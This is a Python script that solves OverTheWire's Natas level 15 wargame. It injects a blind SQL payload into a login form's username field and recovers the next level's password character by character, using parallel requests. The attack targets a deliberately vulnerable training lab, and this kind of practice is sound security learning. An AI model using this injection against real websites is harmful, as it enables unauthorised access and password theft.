import requests
import re
from natas_utility import *
import html
from joblib import Parallel, delayed
import multiprocessing
import time

current_level = 15
credentials = get_credentials(current_level)

base_url = 'http://{}.natas.labs.overthewire.org'.format(credentials['username'])
auth = (credentials['username'], credentials['password'])

session = requests.session()

url = base_url

chars = '0123456789' + 'etaoinshrdlcumwfgypbvkjxqz' + 'etaoinshrdlcumwfgypbvkjxqz'.upper()

def get_letter(i):

    guessed = ''
    desired_len = 32
    for candidate in chars:
        password_candidate = '{}'.format('_' * i + candidate + '_' * (desired_len - i - 1))
        data = {'username': 'natas16" and password like BINARY "{}";#'.format(password_candidate),
                'submit': 'submit'}

        response = session.post(url, data=data, auth=auth)

        content = html.unescape(response.content.decode('utf-8')).replace('<br />', '\n').replace('<br>', '\n')

        exists_regex = re.compile(r'This user (.+)\.')
        exists = exists_regex.findall(content)[0]

        if exists == 'exists':
            guessed += candidate
            break

    return guessed


now = time.time()
inputs = range(0, 32)
num_cores = multiprocessing.cpu_count()
full_results = Parallel(n_jobs=num_cores)(delayed(get_letter)(j) for j in inputs)
print('found {} in {} seconds'.format(''.join(full_results), time.time() - now))

save_credentials(current_level + 1, ''.join(full_results))
